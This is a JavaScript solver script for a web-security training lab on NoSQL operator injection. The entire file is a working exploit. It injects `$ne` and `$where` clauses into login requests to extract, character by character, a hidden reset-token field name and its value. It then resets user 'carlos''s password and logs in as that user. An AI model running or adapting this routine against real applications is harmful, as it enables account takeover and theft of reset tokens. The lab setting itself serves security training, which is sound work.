const { labLogin, resetPassword, runLab, triggerReset } = require('./_common.cjs');

const TITLE = 'Exploiting NoSQL operator injection to extract unknown fields';
const PATH = '/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields';
const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@.-_ ';

function escapeRegexChar(value) {
  return value.replace(/[\\^$.*+?()[\]{}|']/g, '\\$&');
}

async function extractValue(page, labUrl, whereBuilder, maxLength) {
  let value = '';
  for (let i = 0; i < maxLength; i += 1) {
    let found = false;
    for (const ch of CHARS) {
      const clause = whereBuilder(i, ch);
      // eslint-disable-next-line no-await-in-loop
      const response = await page.request.post(labUrl + '/login', {
        headers: { 'Content-Type': 'application/json' },
        data: JSON.stringify({
          username: 'carlos',
          password: { $ne: 'invalid' },
          $where: clause,
        }),
      }).catch(() => null);
      if (!response) continue;
      // eslint-disable-next-line no-await-in-loop
      const text = await response.text();
      const ok = /Account locked: please reset your password/i.test(text);
      if (ok) {
        value += ch;
        found = true;
        if (ch === ' ') {
          return value.trim();
        }
        break;
      }
    }
    if (!found) break;
  }
  return value.trim();
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await triggerReset(page, labUrl, 'carlos');

    const tokenField = await extractValue(
      page,
      labUrl,
      (i, ch) => `Object.keys(this)[4].match('^.{${i}}${escapeRegexChar(ch)}.*')`,
      20,
    );
    if (!tokenField) {
      throw new Error('Reset token field not found');
    }

    const escapedField = tokenField.replace(/'/g, "\\'");
    const token = await extractValue(
      page,
      labUrl,
      (i, ch) => `this['${escapedField}'].match('^.{${i}}${escapeRegexChar(ch)}.*')`,
      36,
    );
    if (!token) {
      throw new Error('Reset token extraction failed');
    }
    console.log(`token field: ${tokenField}`);

    await resetPassword(page, labUrl, tokenField, token, 'carlos', 'password123!');
    await labLogin(page, labUrl, 'carlos', 'password123!');
  },
});
